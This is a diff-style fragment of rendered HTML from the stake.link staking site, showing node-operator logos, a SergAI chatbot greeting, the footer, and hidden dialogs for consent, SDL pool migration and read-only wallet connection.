+       <a class="sc-bgqQcB kAhLXE" rel="noopener noreferrer" title="Simply Staking">
+        <svg class="sc-eePZqt iuVbfA" height="1.5em" viewbox="0 0 200 150" width="2em">
+         <path d="M100.371 38L92 32.7156V22.2844L100.513 17L109 22.2844V32.7156L100.371 38Z" fill="transparent" stroke="currentColor" stroke-width="3.06">
+         </path>
+         <path d="M100 29L99 28.2908V26.7092L100 26L101 26.7092V28.2837L100 29Z" fill="currentColor">
+         </path>
+         <path d="M148.504 125L139 119.716V109.284L148.504 104L158 109.284V119.716L148.504 125Z" fill="transparent" stroke="currentColor" stroke-width="3.06">
+         </path>
+         <path d="M148.504 116L147 115.289V113.711L148.504 113L150 113.711V115.289L148.504 116Z" fill="currentColor">
+         </path>
+         <path d="M133.532 78L124 72.7156V62.312L133.532 57L143 62.312V72.7156L133.532 78Z" fill="transparent" stroke="currentColor" stroke-width="3.06">
+         </path>
+         <path d="M133.504 68L132 67.5272V66.4728L133.504 66L135 66.4728V67.5225L133.504 68Z" fill="currentColor">
+         </path>
+         <path d="M67 78L58 72.7086V62.2914L67 57L76 62.2914V72.7086L67 78Z" fill="transparent" stroke="currentColor" stroke-width="3.06">
+         </path>
+         <path d="M67 68L66 67.5272V66.4728L67 66L68 66.4728V67.5225L67 68Z" fill="currentColor">
+         </path>
+         <path d="M51.5 125L43 119.716V109.284L51.5 104L60 109.284V119.716L51.5 125Z" fill="transparent" stroke="currentColor" stroke-width="3.06">
+         </path>
+         <path d="M51.5 116L50 115.289V113.711L51.5 113L53 113.711V115.289L51.5 116Z" fill="currentColor">
+         </path>
+         <path d="M100.384 134L92 128.693V118.279L100.5 113L109 118.279V128.693L100.384 134Z" fill="transparent" stroke="currentColor" stroke-width="3.06">
+         </path>
+         <path d="M100 125L99 124.289V122.711L100 122L101 122.711V124.289L100 125Z" fill="currentColor">
+         </path>
+         <path d="M99.7126 39V112M76.4892 72.9619L139 109.479M123.511 72.6826L61 109.179" stroke="currentColor" stroke-linecap="square" stroke-width="2.9">
+         </path>
+        </svg>
+        <p class="sc-iHDLbo Aqwwq">
+         Simply Staking
+        </p>
+       </a>
+       <a class="sc-bgqQcB kAhLXE" rel="noopener noreferrer" title="stakefish">
+        <svg class="sc-eePZqt iuVbfA" height="1.5em" viewbox="0 0 200 150" width="2em">
+         <path clip-rule="evenodd" d="M126.649 32C113.646 32 101.981 37.7268 94.0332 46.795C102.847 48.3536 111.115 52.2474 117.95 58.1123C122.705 62.0187 126.918 66.5403 130.478 71.5604L132.498 74.5737C132.812 75.0469 132.812 75.6621 132.498 76.1357L130.491 79.149C126.94 84.1745 122.727 88.6978 117.965 92.5969C111.133 98.4728 102.861 102.37 94.0422 103.92C101.988 112.981 113.65 118.702 126.647 118.702C150.589 118.702 170 99.2925 170 75.3504C170 51.408 150.593 32 126.649 32Z" fill="currentColor" fill-rule="evenodd">
+         </path>
+         <path clip-rule="evenodd" d="M122.005 73.6552C117.014 67.3777 105.436 55.4344 88.9694 54.292C88.7508 54.2776 88.5319 54.265 88.313 54.2543C85.1458 60.2752 83.3504 67.132 83.3504 74.4066C83.3504 81.6813 85.1422 88.5239 88.3025 94.541C88.5301 94.5302 88.758 94.5161 88.9856 94.4998C105.434 93.3843 117.005 81.4696 122.005 75.1905C122.357 74.7404 122.357 74.1071 122.005 73.6552ZM110.162 74.9359C109.871 77.4018 107.637 79.1633 105.171 78.8725C102.907 78.6055 101.203 76.688 101.203 74.4084C101.207 71.9226 103.225 69.9104 105.71 69.914C105.883 69.914 106.055 69.9245 106.227 69.9443C108.693 70.2348 110.453 72.4695 110.162 74.9359ZM49.8017 75.0507C59.989 87.74 74.0075 95.2639 88.2985 94.5392C89.8967 97.5832 91.8461 100.411 94.0935 102.975C92.5762 103.242 91.0444 103.441 89.5001 103.566C88.4903 103.649 87.4644 103.678 86.4565 103.678C74.1169 103.414 62.2561 98.844 52.9296 90.7586C49.8716 88.2063 47.0485 85.3867 44.4927 82.3323C44.3492 82.1907 44.1179 82.1943 43.9762 82.3377C43.96 82.3539 43.9475 82.3702 43.9349 82.3879C41.0348 87.4907 38.7605 92.9233 37.1607 98.5712L37.1266 98.6554L37.0728 98.7399C36.2675 99.965 34.9116 100.715 33.4462 100.749C32.8938 100.733 32.3504 100.609 31.8446 100.386C30.1551 99.6117 29.0735 97.9202 29.0789 96.0619V95.9778L29.0951 95.8936C31.1666 88.5094 34.2677 81.4555 38.305 74.9377C38.5202 74.597 38.5202 74.1628 38.305 73.8221C34.2641 67.3294 31.1684 60.2915 29.1148 52.9235L29.0987 52.8679C28.6736 50.8053 29.6493 48.7087 31.502 47.7079C32.4669 47.2451 33.5825 47.2146 34.5708 47.6236C35.751 48.0809 36.6854 49.0118 37.1463 50.1901L37.1625 50.2745C38.757 55.9026 41.0276 61.3174 43.9206 66.4021C44.0336 66.5689 44.2614 66.6119 44.4281 66.4989C44.4461 66.4864 44.4623 66.4738 44.4784 66.4577C47.0288 63.4122 49.8465 60.5999 52.8991 58.0585C62.9896 49.2342 76.097 44.6463 89.4878 45.2507C91.0336 45.3781 92.5672 45.5789 94.0844 45.848C91.8461 48.402 89.9036 51.2214 88.3094 54.2525C74.0255 53.5441 59.9944 61.0699 49.8017 73.7665C49.4968 74.1414 49.4968 74.6776 49.8017 75.0507Z" fill="currentColor" fill-rule="evenodd">
+         </path>
+        </svg>
+        <p class="sc-iHDLbo Aqwwq">
+         stakefish
+        </p>
+       </a>
+       <a class="sc-bgqQcB kAhLXE" rel="noopener noreferrer" title="Stakin">
+        <svg class="sc-eePZqt iuVbfA" height="1.5em" viewbox="0 0 200 150" width="2em">
+         <path clip-rule="evenodd" d="M47.0134 97.7572C48.246 114.293 60.6628 127.709 76.7274 130.468C78.6257 130.796 80.5725 130.977 82.5611 130.992C82.6598 130.993 82.7568 131 82.8555 131C82.9541 131 83.0511 130.993 83.1498 130.992H84.4243C84.523 130.993 84.62 131 84.7186 131C84.819 131 84.916 130.993 85.0147 130.992H110.475C110.572 130.993 110.671 131 110.77 131C110.868 131 110.965 130.993 111.064 130.992H112.339C112.437 130.993 112.534 131 112.633 131C112.732 131 112.83 130.993 112.927 130.992C114.916 130.977 116.863 130.796 118.761 130.468C134.826 127.709 147.242 114.293 148.475 97.7572C148.493 97.6736 148.515 97.5916 148.534 97.5097C148.564 97.2856 148.584 97.0598 148.584 96.829C148.584 96.6483 148.574 96.471 148.555 96.2971C148.57 95.8823 148.584 95.4675 148.584 95.0494C148.584 83.1662 142.815 72.6326 133.927 66.0881C133.509 65.7803 133.069 65.5027 132.64 65.2134C130.029 63.4606 127.191 62.0222 124.157 60.9969C120.843 59.8764 117.316 59.2224 113.65 59.1187C113.511 59.1087 113.372 59.0986 113.232 59.0986H109.813C107.01 59.0986 104.739 61.3699 104.739 64.1731C104.739 66.9762 107.01 69.2491 109.813 69.2491H113.232C116.562 69.3244 119.733 70.0369 122.638 71.2595C125.028 72.2647 127.234 73.6228 129.194 75.2618C129.912 75.864 130.599 76.4995 131.246 77.1735C135.515 81.6124 138.204 87.5733 138.427 94.1646C138.437 94.459 138.448 94.7534 138.448 95.0494C138.448 109.107 127.212 120.53 113.232 120.85C113.131 120.851 113.031 120.856 112.931 120.858H112.337H104.64H90.8484V110.194C90.8484 105.73 88.1523 102.429 82.8003 102.429C72.4624 102.429 62.1129 98.7624 55.0866 93.4689C49.8717 89.5418 46.7893 93.8101 47.0134 97.7572Z" fill="currentColor" fill-rule="evenodd">
+         </path>
+         <path clip-rule="evenodd" d="M148.57 52.243C147.338 35.7068 134.921 22.2915 118.856 19.5319C116.958 19.204 115.011 19.0234 113.023 19.0084C112.924 19.0067 112.827 19 112.728 19C112.63 19 112.533 19.0067 112.434 19.0084H111.159C111.061 19.0067 110.964 19 110.865 19C110.765 19 110.668 19.0067 110.569 19.0084H85.1083C85.0113 19.0067 84.9126 19 84.814 19C84.7153 19 84.6183 19.0067 84.5196 19.0084H83.2451C83.1465 19.0067 83.0495 19 82.9508 19C82.8521 19 82.7551 19.0067 82.6564 19.0084C80.6678 19.0234 78.721 19.204 76.8227 19.5319C60.7581 22.2915 48.3414 35.7068 47.1087 52.243C47.0903 52.3266 47.0686 52.4085 47.0502 52.4905C47.0201 52.7146 47 52.9404 47 53.1712C47 53.3518 47.01 53.5291 47.0284 53.7031C47.0134 54.1179 47 54.5326 47 54.9508C47 66.834 52.7685 77.3675 61.6563 83.9121C62.0744 84.2198 62.5143 84.4975 62.9441 84.7868C65.5549 86.5396 68.3932 87.978 71.4271 89.0032C74.7404 90.1255 78.2677 90.7778 81.9339 90.8815C82.0727 90.8915 82.2115 90.9015 82.352 90.9015H85.7706C88.5738 90.9015 90.8451 88.6303 90.8451 85.8271C90.8451 83.024 88.5738 80.751 85.7706 80.751H82.352C79.022 80.6758 75.8509 79.9633 72.9458 78.7407C70.5557 77.7355 68.3497 76.3774 66.3895 74.7383C65.672 74.1362 64.9846 73.5007 64.3373 72.8266C60.0691 68.3878 57.3796 62.4269 57.1572 55.8355C57.1472 55.5412 57.1355 55.2485 57.1355 54.9508C57.1355 40.8933 68.3714 29.47 82.352 29.1505C82.4524 29.1488 82.5527 29.1438 82.6531 29.1421H83.2468H90.9437H104.735V39.8061C104.735 44.2701 107.431 47.5716 112.783 47.5716C123.121 47.5716 133.471 51.2378 140.497 56.5313C145.712 60.4584 148.794 56.1901 148.57 52.243Z" fill="currentColor" fill-rule="evenodd">
+         </path>
+        </svg>
+        <p class="sc-iHDLbo Aqwwq">
+         Stakin
+        </p>
+       </a>
+       <a class="sc-bgqQcB kAhLXE" rel="noopener noreferrer" title="Tiingo">
+        <svg class="sc-eePZqt iuVbfA" height="1.5em" viewbox="0 0 200 150" width="2em">
+         <path d="M75.8639 29.6029L44.4121 61.0547L107.309 123.951L138.76 92.4994L75.8639 29.6029Z" fill="currentColor" opacity="0.7">
+         </path>
+         <path d="M124.049 29.2519L75.0469 78.2539L106.499 109.706L155.501 60.7037L124.049 29.2519Z" fill="currentColor" opacity="0.55">
+         </path>
+        </svg>
+        <p class="sc-iHDLbo Aqwwq">
+         Tiingo
+        </p>
+       </a>
+      </div>
+     </section>
+     <section class="sc-hKhKOZ bSlJqA">
+      <h2 class="sc-emqRaN hcMwjc">
+       <span class="sc-kGRGSO fQfGoo">
+        Ecosystem Participants
+       </span>
+      </h2>
+      <div class="sc-ccVCaX gpxSeS">
+       <a class="sc-bgqQcB kAhLXE" rel="noopener noreferrer" title="Chainlink">
+        <svg class="sc-eePZqt qGjxB" height="1.5em" viewbox="0 0 200 150" width="2em">
+         <path class="sc-daSpeN jIDKfu" clip-rule="evenodd" d="M99.5143 40.9619L70.0466 57.951V91.929L99.5143 108.918L128.982 91.929V57.951L99.5143 40.9619ZM148.029 46.97L99.5143 19L51 46.97V102.91L99.5143 130.88L148.029 102.91V46.97Z" fill-rule="evenodd">
+         </path>
+        </svg>
+        <p class="sc-iHDLbo Aqwwq">
+         Chainlink
+        </p>
+       </a>
+      </div>
+     </section>
+     <div class="sc-ccVCaX djVRqd">
+      <div class="sc-ccVCaX dtpbVZ">
+       <div class="sc-ccVCaX ilqlVb">
+        <div class="sc-ccVCaX bQtaQL">
+         <span style="display: block; transform: rotate(45deg);">
+          +
+         </span>
+        </div>
+        <p class="sc-iHDLbo iaTqNq">
+         Welcome!
+         <span class="sc-kGRGSO fudoZs">
+          SergAI
+         </span>
+         here, your oracle for all things stake.link. How may I help you traverse the blockchain today?
+        </p>
+       </div>
+       <div class="sc-ccVCaX iMFrrE">
+        <img alt="SergAI" class="sc-fwEaKe fgoomy" src="/assets/sergai.png"/>
+       </div>
+      </div>
+     </div>
+     <footer class="sc-dzbdsH jtZmHM">
+      <div class="sc-ccVCaX hVgobG">
+       <div class="sc-ccVCaX gJrtpG">
+        <div>
+         <div class="sc-ccVCaX kihDsl">
+          <span class="sc-kGRGSO BiaFm">
+           <svg class="sc-eePZqt bEHOOc" height="1em" viewbox="0 0 200 200" width="1em" xmlns="http://www.w3.org/2000/svg">
+            <path class="sc-daSpeN hWOzPl" d="M176.311 38.8686L116.021 4.05758C106.647 -1.35253 95.1041 -1.35253 85.7303 4.05758L52.6577 25.8093C42.4772 31.6783 42.4772 46.3788 52.6577 52.2478L107.677 85.1813C117.092 90.6192 122.906 100.675 122.906 111.564V120.326L122.753 120.229L123.712 161.938L97.3571 177.181L52.9915 151.744C40.4467 144.553 32.5471 131.369 32.116 116.919L31.6431 101.342L97.6214 139.755L95.118 107.907L8 57.6301L10.2252 126.599C10.2252 142.523 18.7229 157.237 32.5054 165.206L85.7303 195.942C95.1041 201.353 106.647 201.353 116.021 195.942L136.549 184.093C142.529 180.644 146.201 174.26 146.201 167.362V148.406L145.394 100.369C145.394 89.8265 139.943 80.0216 130.972 74.4724L76.7737 39.87L102.433 22.1237L154.337 54.0697C163.321 59.5911 168.801 69.3821 168.829 79.9242L168.926 143.733L191.512 130.854V65.2515C191.512 54.3618 185.699 44.3065 176.283 38.8686H176.311Z">
+            </path>
+           </svg>
+          </span>
+          <p class="sc-iHDLbo hiyohz">
+           stake.link
+          </p>
+         </div>
+         <a class="sc-bgqQcB crQAcY">
+          contact@stake.link
+         </a>
+        </div>
+        <section>
+         <h1 class="sc-dmovaM gRQDhd">
+          Legal
+         </h1>
+         <ul class="sc-ipBWOJ bWLHPh">
+          <li>
+           <button aria-expanded="false" aria-haspopup="dialog" class="sc-jJTsDX jTcoDs connectButton" type="button">
+            <span class="sc-kGRGSO dbcudF">
+             Terms and Conditions
+            </span>
+           </button>
+          </li>
+          <li>
+           <button aria-expanded="false" aria-haspopup="dialog" class="sc-jJTsDX jTcoDs connectButton" type="button">
+            <span class="sc-kGRGSO dbcudF">
+             Privacy Policy
+            </span>
+           </button>
+          </li>
+         </ul>
+        </section>
+        <section>
+         <section>
+          <h1 class="sc-dmovaM gRQDhd">
+           Social
+          </h1>
+          <ul class="sc-ipBWOJ bWLHPh">
+           <li>
+            <a class="sc-bgqQcB crQAcY" rel="noopener noreferrer">
+             Twitter
+            </a>
+           </li>
+           <li>
+            <a class="sc-bgqQcB crQAcY" rel="noopener noreferrer">
+             Mirror
+            </a>
+           </li>
+           <li>
+            <a class="sc-bgqQcB crQAcY" rel="noopener noreferrer">
+             Telegram
+            </a>
+           </li>
+          </ul>
+         </section>
+        </section>
+        <section>
+         <section>
+          <h1 class="sc-dmovaM gRQDhd">
+           Governance
+          </h1>
+          <ul class="sc-ipBWOJ bWLHPh">
+           <li>
+            <a class="sc-bgqQcB crQAcY" rel="noopener noreferrer">
+             Discourse forum
+            </a>
+           </li>
+           <li>
+            <a class="sc-bgqQcB crQAcY" rel="noopener noreferrer">
+             Discord
+            </a>
+           </li>
+          </ul>
+         </section>
+        </section>
+        <section>
+         <section>
+          <h1 class="sc-dmovaM gRQDhd">
+           Resources
+          </h1>
+          <ul class="sc-ipBWOJ bWLHPh">
+           <li>
+            <a class="sc-bgqQcB crQAcY" rel="noopener noreferrer">
+             Docs
+            </a>
+           </li>
+          </ul>
+         </section>
+        </section>
+       </div>
+      </div>
+     </footer>
+     <div class="sc-UnBNk eTaPqn" data-dialog-ref="id-7dcnbj" hidden="" style="display: none; background-color: rgba(0, 0, 0, 0.76);">
+      <div aria-label="Blacklisted" class="sc-dSLLkn iEBapg" data-dialog="true" hidden="" id="id-7dcnbj" role="dialog" style="display: none; background-color: rgb(255, 255, 255);" tabindex="0" w="[object Object]">
+       <div class="sc-kRJYiJ cxpqSC">
+       </div>
+       <div class="sc-btjTMA foNTFx">
+        <button class="sc-jJTsDX eRVllp connectButton" type="button">
+         Ok
+        </button>
+       </div>
+      </div>
+     </div>
+     <div class="sc-UnBNk eTaPqn" data-dialog-ref="id-0ar1rk" hidden="" style="display: none; background-color: rgba(0, 0, 0, 0.76);">
+      <div aria-label="Consent" class="sc-dSLLkn iEBapg" data-dialog="true" hidden="" id="id-0ar1rk" role="dialog" style="display: none; background-color: rgb(255, 255, 255);" tabindex="0" w="[object Object]">
+       <div class="sc-kRJYiJ cxpqSC">
+        <section class="sc-hKhKOZ gFhMnL">
+         <svg aria-hidden="true" class="sc-eePZqt pGzbr" fill="currentColor" focusable="false" height="20" preserveaspectratio="xMidYMid meet" viewbox="0 0 32 32" width="20" xmlns="http://www.w3.org/2000/svg">
+          <path d="M29 21.2783V19a4 4 0 00-8 0v2.2783A1.9935 1.9935 0 0020 23v5a2.0025 2.0025 0 002 2h6a2.0025 2.0025 0 002-2V23A1.9935 1.9935 0 0029 21.2783zM25 17a2.0025 2.0025 0 012 2v2H23V19A2.0025 2.0025 0 0125 17zM22 28V23h6v5zM2 2H4V6H2zM14 2H16V6H14zM18 2H20V6H18zM2 8H4V16H2zM2 18H4V26H2zM14 18H16V26H14zM6 8H8V16H6zM18 8H20V14H18zM10 26H8a2.0023 2.0023 0 01-2-2V20a2.0023 2.0023 0 012-2h2a2.0023 2.0023 0 012 2v4A2.0023 2.0023 0 0110 26zM8 20v4h2V20zM14 16H12a2.0023 2.0023 0 01-2-2V10a2.0023 2.0023 0 012-2h2a2.0023 2.0023 0 012 2v4A2.0023 2.0023 0 0114 16zm-2-6v4h2V10zM10 6H8A2.0023 2.0023 0 016 4V2H8V4h2V2h2V4A2.0023 2.0023 0 0110 6z">
+          </path>
+         </svg>
+         <section class="sc-hKhKOZ">
+          <p class="sc-iHDLbo jGFuxb">
+           Before you start
+          </p>
+          <div class="sc-ccVCaX FfXhN">
+           <p class="sc-iHDLbo glZlJB">
+            Terms of use
+           </p>
+          </div>
+         </section>
+        </section>
+        <div class="sc-ccVCaX kBPeGc">
+        </div>
+        <div class="sc-dmYKOh cdHWGo">
+         <div class="sc-kLpbBz kmdJNY">
+          <div class="markdown-body">
+          </div>
+         </div>
+        </div>
+       </div>
+       <div class="sc-btjTMA foNTFx">
+        <button class="sc-jJTsDX jZwYru connectButton" type="button">
+         Cancel
+        </button>
+        <button class="sc-jJTsDX eRVllp connectButton" type="button">
+         Agree
+        </button>
+       </div>
+      </div>
+     </div>
+     <div class="sc-UnBNk eTaPqn" data-dialog-ref="id-lrfgab" hidden="" style="display: none; background: linear-gradient(0deg, rgba(24, 24, 24, 0.9) 0%, rgba(52, 67, 200, 0.3) 100%);">
+      <div aria-label="migration" class="sc-dSLLkn iEBapg" data-dialog="true" hidden="" id="id-lrfgab" role="dialog" style="display: none;" tabindex="0" w="[object Object]">
+       <div class="sc-kRJYiJ cxpqSC">
+        <div class="sc-ccVCaX">
+         <div class="sc-ccVCaX kzPzev">
+          <h2 class="sc-emqRaN hTMtMk">
+           SDL Pool Migration
+          </h2>
+         </div>
+         <p class="sc-iHDLbo hmTKPj">
+          Please upgrade your
+          <b>
+           stSDL
+          </b>
+          to
+          <b>
+           reSDL
+          </b>
+          . Select your lock period and earn even more rewards.
+         </p>
+         <div class="sc-ccVCaX djdUnr">
+          <div class="sc-ccVCaX FfXhN">
+           <svg class="sc-eePZqt evWtut" height="1em" viewbox="0 0 200 200" width="1em" xmlns="http://www.w3.org/2000/svg">
+            <path class="sc-daSpeN fNtHQK" d="M176.311 38.8686L116.021 4.05758C106.647 -1.35253 95.1041 -1.35253 85.7303 4.05758L52.6577 25.8093C42.4772 31.6783 42.4772 46.3788 52.6577 52.2478L107.677 85.1813C117.092 90.6192 122.906 100.675 122.906 111.564V120.326L122.753 120.229L123.712 161.938L97.3571 177.181L52.9915 151.744C40.4467 144.553 32.5471 131.369 32.116 116.919L31.6431 101.342L97.6214 139.755L95.118 107.907L8 57.6301L10.2252 126.599C10.2252 142.523 18.7229 157.237 32.5054 165.206L85.7303 195.942C95.1041 201.353 106.647 201.353 116.021 195.942L136.549 184.093C142.529 180.644 146.201 174.26 146.201 167.362V148.406L145.394 100.369C145.394 89.8265 139.943 80.0216 130.972 74.4724L76.7737 39.87L102.433 22.1237L154.337 54.0697C163.321 59.5911 168.801 69.3821 168.829 79.9242L168.926 143.733L191.512 130.854V65.2515C191.512 54.3618 185.699 44.3065 176.283 38.8686H176.311Z">
+            </path>
+           </svg>
+           <div class="sc-ccVCaX gCxUAe">
+            <section class="sc-hKhKOZ">
+             <p class="sc-iHDLbo bTYALt">
+              Your stSDL Balance
+             </p>
+             <div class="sc-ccVCaX FfXhN">
+              <p class="sc-iHDLbo byqFqS">
+               0.00 stSDL
+              </p>
+             </div>
+            </section>
+           </div>
+          </div>
+          <div class="sc-ccVCaX FfXhN">
+           <svg class="sc-eePZqt evWtut" height="1em" viewbox="0 0 200 200" width="1em" xmlns="http://www.w3.org/2000/svg">
+            <path class="sc-daSpeN fNtHQK" d="M166.832 109.947V138.514L139.943 154.089L159.749 165.574L186.666 149.999V109.947H166.832Z">
+            </path>
+            <path class="sc-daSpeN fNtHQK" d="M33.8342 90.1101V61.4849L60.723 45.9107L40.9178 34.4258L14 50V90.1101H33.8342Z">
+            </path>
+            <path class="sc-daSpeN fNtHQK" d="M33.8341 138.514V109.947H14V149.999L40.9178 165.574L60.7519 154.089L33.8341 138.514Z">
+            </path>
+            <path class="sc-daSpeN fNtHQK" d="M120.14 165.545L100.335 177.03L80.5295 165.574L60.6953 177.03L100.335 200L139.974 177.03L120.14 165.545Z">
+            </path>
+            <path class="sc-daSpeN fNtHQK" d="M80.5295 34.4547L100.335 22.9698L120.169 34.4547L139.974 22.9698L100.335 0L60.6953 22.9698L80.5295 34.4547Z">
+            </path>
+            <path class="sc-daSpeN fNtHQK" d="M159.778 34.4258L139.943 45.9107L166.832 61.4849V90.1101H186.666V50L159.778 34.4258Z">
+            </path>
+            <path class="sc-daSpeN fNtHQK" d="M100.331 131.208L73.3845 115.692V84.4854L100.273 68.8822L127.22 84.3694V115.547L100.331 131.208ZM100.331 154.091L110.219 148.377L137.137 132.716L147.025 127.003V72.8845L137.137 67.1711L110.19 51.6549L100.302 45.9414L90.4141 51.6549L63.5542 67.2871L53.666 73.0005V127.177L63.5542 132.89L90.5009 148.377L100.389 154.091H100.331V154.091Z">
+            </path>
+           </svg>
+           <div class="sc-ccVCaX gCxUAe">
+            <section class="sc-hKhKOZ">
+             <p class="sc-iHDLbo bTYALt">
+              Your stLINK Rewards
+             </p>
+             <div class="sc-ccVCaX FfXhN">
+              <p class="sc-iHDLbo byqFqS">
+               0.00 stLINK
+              </p>
+             </div>
+            </section>
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+       <div class="sc-btjTMA foNTFx">
+        <button class="sc-jJTsDX cCzEmQ connectButton" type="button">
+         OK
+        </button>
+       </div>
+      </div>
+     </div>
+    </main>
+   </div>
+  </div>
+  <link href="https://fonts.googleapis.com" rel="preconnect"/>
+  <link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+  <link as="style" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&amp;display=swap" onload="this.onload=null;this.rel='stylesheet'" rel="stylesheet"/>
+  <div class="__reakit-portal">
+   <div class="sc-UnBNk eTaPqn" data-dialog-ref="id-r6n5lt" hidden="" style="display: none;">
+    <div aria-label="Select Asset" aria-modal="true" class="sc-dSLLkn eqwqQl" data-dialog="true" hidden="" id="id-r6n5lt" radius="0" role="dialog" style="display: none;" tabindex="0" w="[object Object]">
+     <div class="sc-kRJYiJ cxpqSC">
+      <button class="sc-jJTsDX imagQU connectButton" type="button">
+       <svg aria-hidden="true" class="sc-eePZqt gPtRME" fill="currentColor" focusable="false" height="20" preserveaspectratio="xMidYMid meet" viewbox="0 0 32 32" width="20" xmlns="http://www.w3.org/2000/svg">
+        <path d="M16,2C8.2,2,2,8.2,2,16s6.2,14,14,14s14-6.2,14-14S23.8,2,16,2z M16,28C9.4,28,4,22.6,4,16S9.4,4,16,4s12,5.4,12,12	S22.6,28,16,28z">
+        </path>
+        <path d="M21.4 23L16 17.6 10.6 23 9 21.4 14.4 16 9 10.6 10.6 9 16 14.4 21.4 9 23 10.6 17.6 16 23 21.4z">
+        </path>
+       </svg>
+      </button>
+      <section class="sc-hKhKOZ">
+       <h2 class="sc-emqRaN chIgVd">
+        Read-only mode
+       </h2>
+       <p class="sc-iHDLbo kGZmZz">
+       </p>
+       <div class="sc-ccVCaX jVqoaU">
+        <div class="sc-ccVCaX hczSSy">
+         <div class="sc-ccVCaX dtpbVZ">
+          <input aria-label="Address" class="sc-hpGEOZ ghjVBO" id="Address" name="Address" placeholder="Enter your account address" value=""/>
+          <span class="sc-kGRGSO fNPerj">
+           <span class="sc-kGRGSO">
+           </span>
+           <span class="sc-kGRGSO eMeBJN">
+           </span>
+          </span>
+         </div>
+        </div>
+        <div class="sc-ccVCaX eZVQlu">
+         <button aria-disabled="true" class="sc-jJTsDX brJOtg connectButton" disabled="" style="pointer-events: none;" type="button">
+          Connect
+         </button>
+         <button aria-disabled="true" class="sc-jJTsDX gBMroB connectButton" disabled="" style="pointer-events: none;" type="button">
+          Disconnect
+         </button>
+        </div>
+       </div>
+      </section>
+     </div>
+    </div>
+   </div>
+  </div>
+  <div class="__reakit-portal">
+   <div class="sc-UnBNk eTaPqn" data-dialog-ref="id-6k1gg9" hidden="" style="display: none;">
+    <div aria-label="Terms of use" aria-modal="true" class="sc-dSLLkn iEBapg" data-dialog="true" hidden="" id="id-6k1gg9" role="dialog" style="display: none;" tabindex="-1" w="[object Object]">
+     <div class="sc-fJHqna kqTMsE">
+      <h1 class="sc-dmovaM gUoAKt">
+       Terms of use
+      </h1>
+     </div>
+     <div class="sc-kRJYiJ cxpqSC">
+      <div class="sc-ccVCaX dHDceW">
+      </div>
+     </div>
+     <div class="sc-btjTMA foNTFx">
+      <button class="sc-jJTsDX OdvVs connectButton" type="button">
+       Close
+      </button>
+     </div>
+    </div>
+   </div>
+  </div>
+  <div class="__reakit-portal">
+   <div class="sc-UnBNk eTaPqn" data-dialog-ref="id-rt0t4p" hidden="" style="display: none;">
+    <div aria-label="Privacy policy" aria-modal="true" class="sc-dSLLkn iEBapg" data-dialog="true" hidden="" id="id-rt0t4p" role="dialog" style="display: none;" tabindex="-1" w="[object Object]">
+     <div class="sc-fJHqna kqTMsE">
+      <h1 class="sc-dmovaM gUoAKt">
+       Privacy policy
+      </h1>
+     </div>
+     <div class="sc-kRJYiJ cxpqSC">
+      <div class="sc-ccVCaX dHDceW">
+      </div>
+     </div>
+     <div class="sc-btjTMA foNTFx">
+      <button class="sc-jJTsDX OdvVs connectButton" type="button">
+       Close
+      </button>
+     </div>
+    </div>
+   </div>
+  </div>
+  <iframe id="verify-api" src="https://verify.walletconnect.com/7dc1f8b5ac9c06f4ffc0873cb0fc0a7a" style="display: none;">
+  </iframe>
+  <wcm-modal>
+  </wcm-modal>
+  <div class="__tooltip-portal">
+   <span class="sc-kCvKRn brWjxJ" style="visibility: hidden;">
+    This reward rate is inclusive of locked LINK rewards in Chainlink Staking v0.2. They will mostly unlock by the 7th of March 2024.
+   </span>
+  </div>
+  <div class="__tooltip-portal">
+   <span class="sc-kCvKRn brWjxJ" style="visibility: hidden;">
+    Reward rate from latest distribution at 4 year lock. This reward rate is inclusive of locked LINK rewards in Chainlink Staking v0.2. They will mostly unlock by the 7th of March 2024.
+   </span>
+  </div>
+ </body>
+</html>
